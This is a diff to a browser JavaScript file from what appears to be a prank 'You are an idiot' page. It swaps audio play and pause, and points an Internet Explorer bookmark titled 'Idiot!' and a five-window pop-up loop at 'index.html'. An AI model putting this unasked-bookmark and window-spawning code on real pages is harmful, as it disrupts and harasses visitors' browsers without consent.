@@ -8,11 +8,11 @@ function musicPlay() {
 	micon.addEventListener('click', musicPlay);
 	
 	if (audio.duration > 0 && audio.paused) {
-		audio.play();
+		audio.pause();
 		micon.src = "images/speaker.png";
 	}
 	else {
-		audio.pause();
+		audio.play();
 		audio.currentTime = 0;
 		
 		micon.src = "images/speakerm.png";
@@ -36,7 +36,7 @@ faudio.addEventListener('timeupdate', function() {
 
 function bookmark() {
 	if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
-		var url = "lol.html";
+		var url = "index.html";
 		var title = "Idiot!";
 		
 		window.external.AddFavorite(url, title);
@@ -59,7 +59,7 @@ function openWindow(url) {
 
 function proCreate() {	
 	for (var i = 0; i < 5; i++) {
-		openWindow('lol.html');
+		openWindow('index.html');
 	}
 }
 
